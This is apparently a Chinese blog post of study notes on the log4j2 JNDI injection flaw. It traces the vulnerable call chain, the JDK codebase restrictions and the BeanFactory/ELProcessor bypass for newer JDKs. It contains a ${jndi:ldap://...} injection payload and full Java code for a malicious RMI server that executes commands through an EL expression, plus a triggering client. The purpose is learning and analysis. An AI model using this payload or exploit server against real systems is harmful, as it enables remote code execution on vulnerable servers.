---
title: log4j2漏洞学习记录
date: 2022-09-23 14:15:14
tags:
      - log4j2
categories: java
---

# lo4gj2漏洞简单学习记录

log4j2和log4j简单的小区别

>- Log4j2分为2个jar包，一个是接口 log4j-api-版 本 号 . j a r   ， 一 个 是 具 体 实 现   l o g 4 j − c o r e − {版本号}.jar ，一个是具体实现 log4j-core-版本号.jar ，一个是具体实现 log4j−core−{版本号}.jar 。Log4j只有一个jar包 log4j-${版本号}.jar 。
>
>- Log4j2的版本号目前均为2.x。Log4j的版本号均为1.x。
>
>- Log4j2的package名称前缀为 org.[apache](https://so.csdn.net/so/search?q=apache&spm=1001.2101.3001.7020).logging.log4j 。Log4j的package名称前缀为 org.apache.log4j 。

## jdk低版本

在低版本jdk中,可以通过ldap和rmi服务构造远程恶意类来让其执行恶意代码

1、首先攻击者遭到存在风险的接口（接口会将前端输入直接通过日志打印出来），然后向该接口发送攻击内容：${jndi:ldap://localhost:9999/Test}。

2、被攻击服务器接收到该内容后，通过Logj42工具将其作为日志打印。

源码：org.apache.logging.slf4j.Log4jLogger.debug(...)/info(...)/error(...)等方法

            > org.apache.logging.log4j.core.config.LoggerConfig.log(...)
    
                  > AbstractOutputStreamAppender.append(final LogEvent event)

3、此时Log4j2会解析${}，读取出其中的内容。判断其为Ldap实现的JNDI。于是调用Java底层的Lookup方法，尝试完成Ldap的Lookup操作。

源码：StrSubstitutor.substitute(...) --解析出${}中的内容：jndi:ldap://localhost:9999/Test

                > StrSubstitutor.resolveVariable(...) --处理解析出的内容，执行lookup
    
                > Interpolator.lookup(...) --根据jndi找到jndi的处理类
    
                        > JndiLookup.lookup(...)
    
                        > JndiManager.lookup(...)
    
                                > java.naming.InitialContext.lookup(...) --调用Java底层的Lookup方法
后面调用的就是`InitialContext.lookup方法`从而执行了恶意代码

##### 低版本攻击原理

通过上面低版本的原理分析可知，我们根据在Ldap构造了javaFactoryLocation指向Codebase，告诉客户端需要从远端Codebase去获取需要的javaFactory类。获取到之后，然后使其使用本地的类加载器加载远程恶意的javaFactory类的，然后其在加载的过程中执行恶意的static代码块，从而实现攻击。

### jdk对于lookup方法的修复

RMI的JNDI注入在`8u121`后限制,需要手动开启`com.sun.jndi.rmi.object.trustURLCodebase`属性

RMI的JNDI注入在`8u191`后限制,需要手动开启`com.sun.jndi.rmi.object.trustURLCodebase`属性

#### 限制版本绕过

RMI的限制是限制了远程的工厂类而不限制本地,所以用本地工厂类触发

通过`org.apache.naming.factory.BeanFactory`结合`ELProcessor`绕过

LDAP的限制中不对`javaSerializedData`验证,所以可以打本地`gadget`

### 具体代码执行的地方

在`NamingManager.getObjectFactoryFromReference()`方法中,如果在默认的classpath加载不到该类

就会请求reference中的codebase得到class内容并使用类加载器加载,之后通过默认构造函数构造对象

![image-20220922165932132](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922165932132.png)

#### 什么是codebase

codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的 CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。

### 高版本为何无效

上述所有操作都必须在JDK8u191之前才可以实现

在`VersionHelper12.loadClass`中加了一个对于trustURLCodebase的判断来控制是否允许请求codebase下载对应的class文件,其默认为false

![image-20220922172036555](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922172036555.png)

可以手动开启trustURLCodebase

`System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");`将其指定为true，

## jdk高版本

### lookup基本功能

当java底层请求ldap服务之后,ldap主要返回了三个参数javaClassName,javaFactory,javaFactoryLocation,以及一些额外参数,客户端获得这些参数之后主要做一件事情:构造需要的类实例,即客户端通过javaFactory类来构建实现我们需要的javaClassName执行的实例,这个过程中需要注意一下几点

- javaFactory类是ObjectFactory的子类

- javaFactory有两个来源:来自codebase(ldap返回的codebase地址),或者来自本地(ldap返回对应javaFactory的类地址)

  ![image-20220922174055442](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922174055442.png)

  - ​	对于来自codeabse的Factory:和低版本中的逻辑一样,我们需要请求Codebase获取其class文件,然后加载该Factory类,并使用默认构造函数实例化出Factory实例

  - 来自本地的Factory:直接根据ldap返回的路径(类限定符),通过Class.forName进行加载和实例化

- 得到javaFactory实例后,我们需要构建通过javaFactory实例构建出JavaClassName指定的对象
- log4j2通过javaFactory得到对应的对象之后,会调用其toString方法将其转换为字符串,然后用该字符串替换日志中的${...}内容,并且打印出来

![image-20220922180330569](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220922180330569.png)

### 高版本如何利用ldap实现攻击

我们知道高版本已经无法通过codebase获取javaFactory的class文件,所以我们想通过让客户端加载和实例化我们构建的javaFactory来实现攻击是不可能的了

但是还可以通过ldap实例化本地的javaFactory,并且用本地的javaFactory实例化一个本地存在的类所以现在的问题就是如何找到一个可以被利用的本地javaFactory类

>https://www.veracode.com/blog/research/exploiting-jndi-injections-java

参考文章中提到了tomcat携带的org.apache.naming.factory.BeanFactory类就是一个存在风险的ObjectFactory子类。通过该Factory我们可以通过默认构造函数实例化任意一个类，并调用其任意的只有一个String入参的公共方法，且其方法名可以不用是标准setter的名称，而可以是任意名称。因为我们可以通过forceString来制定某个String变量的setter方法名称。

![image-20220923135856558](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923135856558.png)

在红框中会强制替换setterName和对应的param名称

![image-20220923140033950](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140033950.png)

之后将param和param对应的setter方法放到map  `forced`中

并在接下来的代码中进行调用

![image-20220923140150754](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923140150754.png)

基于此能力,我们就可利用`javax.el.ELProcessor`类,因为其有默认公开的无参构造方法,还有个eval方法,只有一个String入参,其可以执行EL表达式,从而执行任意指令

>  这里埋个伏笔,完事可以尝试使用codeql来查询是否存在这样的类

evilServer

```java
import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.naming.ResourceRef;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class EvilRMIServerNew {
    public static void main(String[] args) throws Exception {
        System.out.println("Creating evil RMI registry on port 1097");
        Registry registry = LocateRegistry.createRegistry(1097);
 
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        //redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        ref.add(new StringRefAddr("forceString", "x=eval"));
        //expression language to execute 'nslookup jndi.s.artsploit.com', modify /bin/sh to cmd.exe if you target windows
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
        
 //这里el表达式是通过""空字符串.getClass
 
        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
        registry.bind("Object", referenceWrapper);
    }
}
```

最后执行的el表达式长这样

![image-20220923191015111](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191015111.png)

通过""的string类型获取到String的class,所有class都继承于Class类,隐含这forName这个加载方法加载类

![image-20220923191700911](https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220923191700911.png)

client

```java
public class client {
    public static void main(String[] args)throws Exception {
        String url="rmi://127.0.0.1:1097/Object";
        Context ctx=new InitialContext();
        ctx.lookup(url);
    }
}
```



